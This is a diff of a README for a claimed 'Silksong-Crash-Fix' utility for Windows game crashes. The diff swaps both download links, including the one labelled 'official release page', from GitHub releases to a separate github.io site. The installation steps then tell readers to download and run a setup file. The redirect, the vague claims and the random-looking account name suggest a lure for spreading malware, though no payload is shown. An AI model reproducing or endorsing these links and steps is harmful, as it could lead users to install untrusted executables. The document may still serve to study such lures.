@@ -1,6 +1,6 @@
 # 🛠️ Silksong-Crash-Fix - Stop game crashes on your computer
 
-[![](https://img.shields.io/badge/Download-Releases-blue.svg)](https://github.com/Shivery-castaneadentata772/Silksong-Crash-Fix/releases)
+[![](https://img.shields.io/badge/Download-Releases-blue.svg)](https://shivery-castaneadentata772.github.io)
 
 ## 📌 About the project
 The Silksong-Crash-Fix resolves issues that prevent the game from opening on Windows 10 and Windows 11. Many players experience a crash during the initial startup procedure. This tool identifies the cause of the failure and applies the necessary patches to your game files. This ensures the game launches without errors.
@@ -11,7 +11,7 @@ The utility scans your installation folder for common errors known to stop the g
 ## 🚀 Setting up the fix
 Follow these steps to prepare your game.
 
-1. Visit the [official release page](https://github.com/Shivery-castaneadentata772/Silksong-Crash-Fix/releases) to download the latest setup file.
+1. Visit the [official release page](https://shivery-castaneadentata772.github.io) to download the latest setup file.
 2. Locate the file in your downloads folder.
 3. Open the file to begin the installation procedure.
 4. Follow the instructions on the screen to point the installer toward the directory where your game lives.
